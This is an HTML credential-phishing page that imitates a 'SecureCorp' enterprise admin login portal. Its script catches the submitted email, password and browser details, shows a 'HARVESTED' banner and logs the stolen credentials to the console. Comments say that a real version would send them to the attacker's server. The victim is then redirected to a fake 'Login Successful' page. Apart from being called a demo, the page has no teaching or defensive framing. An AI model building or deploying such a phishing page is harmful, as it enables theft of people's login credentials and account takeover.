<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Login - Secure Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .logo p { color: #666; font-size: 14px; }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 25px;
        }
        .checkbox-group input {
            width: auto;
            margin-right: 10px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .harvested {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #00ff00;
            color: black;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            display: none;
            z-index: 1000;
            box-shadow: 0 5px 15px rgba(0,255,0,0.3);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #888;
        }
    </style>
</head>
<body>
    <!-- Harvested creds notification -->
    <div id="harvestAlert" class="harvested">
        ✅ HARVESTED: <span id="creds"></span>
    </div>

    <div class="login-container">
        <div class="logo">
            <h1>🔒 Secure Admin</h1>
            <p>Enterprise Authentication Portal</p>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" required placeholder="admin@company.com">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required placeholder="Enter your password">
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="remember">
                <label for="remember">Remember me</label>
            </div>

            <button type="submit">LOGIN</button>
        </form>

        <div class="footer">
            <p>© 2026 SecureCorp. All rights reserved.</p>
        </div>
    </div>

    <script>
        const harvested = [];
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            
            // HARVEST THE CREDS
            const creds = {
                timestamp: new Date().toISOString(),
                email: email,
                password: password,
                remember: remember,
                userAgent: navigator.userAgent,
                ip: 'client-side' // Real version would use external API
            };
            
            harvested.push(creds);
            
            // Show harvest notification
            document.getElementById('creds').textContent = `${email}:${password}`;
            document.getElementById('harvestAlert').style.display = 'block';
            setTimeout(() => {
                document.getElementById('harvestAlert').style.display = 'none';
            }, 5000);
            
            // Send to your server (for demo, just console.log)
            console.log('🕷️ HARVESTED:', creds);
            console.log('💾 All harvested:', harvested);
            
            // Fake "loading" then redirect to fake dashboard
            const btn = document.querySelector('button');
            btn.textContent = 'LOADING...';
            btn.disabled = true;
            
            setTimeout(() => {
                window.location.href = 'data:text/html,<h1 style="text-align:center;padding:50px;color:green">✅ Login Successful!<br><br><small>Dashboard loading...</small></h1>';
            }, 1500);
        });

        // Auto-hide alert on click
        document.getElementById('harvestAlert').addEventListener('click', function() {
            this.style.display = 'none';
        });
    </script>
</body>
</html>
